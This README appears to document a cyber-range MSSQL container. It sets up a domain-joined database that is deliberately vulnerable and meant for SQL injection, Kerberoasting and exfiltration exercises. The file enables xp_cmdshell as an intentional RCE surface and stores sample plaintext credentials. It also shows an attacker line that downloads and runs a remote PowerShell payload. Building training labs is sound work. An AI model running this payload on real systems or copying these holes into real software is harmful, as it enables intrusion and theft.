# dockerfiles/db01/ — MSSQL Database Server

db01 runs Microsoft SQL Server 2022 on Ubuntu 22.04. It is domain-joined to `secure.net` and hosts a sample database with sensitive data. It is the target for SQL injection, Kerberoasting (via `svc_mssql` service account), and database exfiltration scenarios.

**Container:** db01  
**Control IP:** 10.0.0.30  
**DB segment IP:** 10.40.40.10  
**Exposed services:** MSSQL :1433, SSH :22

---

## Files

| File | Purpose |
|------|---------|
| `Dockerfile` | Ubuntu 22.04 + MSSQL 2022 + realmd/sssd + Wazuh + Saffron |
| `entrypoint.sh` | Domain join, DB init, Wazuh enrollment, Saffron start, MSSQL start |
| `init.sql` | Database schema + sample data (sensitive-looking records for exfil scenarios) |

---

## Dockerfile

```dockerfile
FROM ubuntu:22.04

ARG WAZUH_VERSION=4.9.2
ARG DEBIAN_FRONTEND=noninteractive

# Microsoft SQL Server 2022 package repository
RUN curl -sSL https://packages.microsoft.com/keys/microsoft.asc | apt-key add - && \
    curl -sSL https://packages.microsoft.com/config/ubuntu/22.04/mssql-server-2022.list \
        -o /etc/apt/sources.list.d/mssql-server.list && \
    curl -sSL https://packages.microsoft.com/config/ubuntu/22.04/prod.list \
        -o /etc/apt/sources.list.d/mssql-tools.list

RUN apt-get update && apt-get install -y --no-install-recommends \
    mssql-server \
    mssql-tools \
    unixodbc-dev \
    # Domain join
    realmd sssd sssd-tools sssd-ad adcli samba-common-bin \
    # Utilities
    openssh-server sudo curl \
    rsyslog \
    && rm -rf /var/lib/apt/lists/*

# PATH for sqlcmd
ENV PATH="$PATH:/opt/mssql-tools/bin"

# Wazuh agent
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add - && \
    echo "deb https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list && \
    apt-get update && apt-get install -y wazuh-agent=${WAZUH_VERSION}-1

# Saffron agent
COPY saffron-agent-linux-amd64 /usr/local/bin/saffron-agent
RUN chmod +x /usr/local/bin/saffron-agent

# SSH
RUN mkdir /var/run/sshd && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config

# sssd.conf template (domain join config filled at runtime)
COPY sssd.conf.tmpl /etc/sssd/sssd.conf.tmpl

# DB init script
COPY init.sql /opt/mssql/init.sql

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22 1433
ENTRYPOINT ["/entrypoint.sh"]
```

---

## entrypoint.sh

```bash
#!/usr/bin/env bash
set -euo pipefail

# 1. Wait for dc01 to be available before attempting domain join
echo "[db01] Waiting for DC at 10.20.20.100..."
until nc -z 10.20.20.100 389 2>/dev/null; do sleep 5; done
echo "[db01] DC reachable"

# 2. Domain join (idempotent — skip if already joined)
if ! realm list | grep -q "secure.net"; then
    echo "${RANGE_PASSWORD}" | realm join \
        --user Administrator \
        --computer-ou "OU=Servers,DC=secure,DC=net" \
        secure.net
fi

# 3. Configure sssd (from template)
envsubst < /etc/sssd/sssd.conf.tmpl > /etc/sssd/sssd.conf
chmod 600 /etc/sssd/sssd.conf
systemctl start sssd 2>/dev/null || sssd &

# 4. Initialize MSSQL
ACCEPT_EULA="${ACCEPT_EULA}" MSSQL_SA_PASSWORD="${MSSQL_SA_PASSWORD}" \
    /opt/mssql/bin/mssql-conf setup

# 5. Start MSSQL in background, wait for it, run init.sql
/opt/mssql/bin/sqlservr &
until sqlcmd -S localhost -U sa -P "${MSSQL_SA_PASSWORD}" -Q "SELECT 1" &>/dev/null; do
    sleep 3
done
sqlcmd -S localhost -U sa -P "${MSSQL_SA_PASSWORD}" -i /opt/mssql/init.sql

# 6. Saffron agent
saffron-agent --server "${COMMANDLY_SERVER:-http://10.0.0.1:8080}" --hostname db01 &

# 7. Wazuh enrollment
/var/ossec/bin/agent-auth \
    -m "${WAZUH_MANAGER:-10.0.0.5}" \
    -P "${WAZUH_ENROLLMENT_PSK}" \
    -A "db01"
/var/ossec/bin/wazuh-control start

# 8. syslog + SSH
echo "*.* @10.50.50.8:514" >> /etc/rsyslog.conf
rsyslogd
/usr/sbin/sshd

# Keep alive (MSSQL is in background)
exec wait
```

---

## init.sql

```sql
-- Create sample database with sensitive-looking data
CREATE DATABASE RangeDB;
GO

USE RangeDB;
GO

-- Employee table (data exfiltration target)
CREATE TABLE Employees (
    EmployeeID   INT PRIMARY KEY IDENTITY,
    Username     NVARCHAR(50),
    Department   NVARCHAR(50),
    Salary       DECIMAL(10,2),
    SSN          NVARCHAR(11),
    Email        NVARCHAR(100)
);

INSERT INTO Employees VALUES
    ('jsmith',    'IT',       95000.00, '123-45-6789', 'jsmith@secure.net'),
    ('mjones',    'IT',       88000.00, '234-56-7890', 'mjones@secure.net'),
    ('bwilson',   'Finance',  72000.00, '345-67-8901', 'bwilson@secure.net'),
    ('alee',      'Finance',  68000.00, '456-78-9012', 'alee@secure.net'),
    ('cthompson', 'Ops',      61000.00, '567-89-0123', 'cthompson@secure.net');

-- Credentials table (intentional vulnerability — simulates app storing creds in DB)
CREATE TABLE AppCredentials (
    AppName   NVARCHAR(100),
    Username  NVARCHAR(100),
    Password  NVARCHAR(256)
);

INSERT INTO AppCredentials VALUES
    ('MonitoringApp', 'monitor_svc', 'W3bM0n!t0r'),
    ('BackupApp',     'backup_svc',  'B@ckup2024!');

GO

-- Grant svc_mssql read access (Kerberoasting service account also has DB access)
CREATE LOGIN [SECURE\svc_mssql] FROM WINDOWS;
USE RangeDB;
CREATE USER [SECURE\svc_mssql] FOR LOGIN [SECURE\svc_mssql];
ALTER ROLE db_datareader ADD MEMBER [SECURE\svc_mssql];
GO

-- Enable xp_cmdshell (allows OS command execution via SQL — intentional RCE surface)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
GO
```

### xp_cmdshell Attack Surface

`xp_cmdshell` is explicitly enabled. This allows a SQL injection attack that achieves MSSQL `sa` authentication to run arbitrary OS commands:

```sql
-- Attacker achieves this after SQL injection + SA auth
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://9.53.99.1/payload.ps1'')"'
```

This is the attack path for MSSQL-based RCE scenarios. Wazuh on db01 should alert on `xp_cmdshell` execution (SQL Server audit log event).
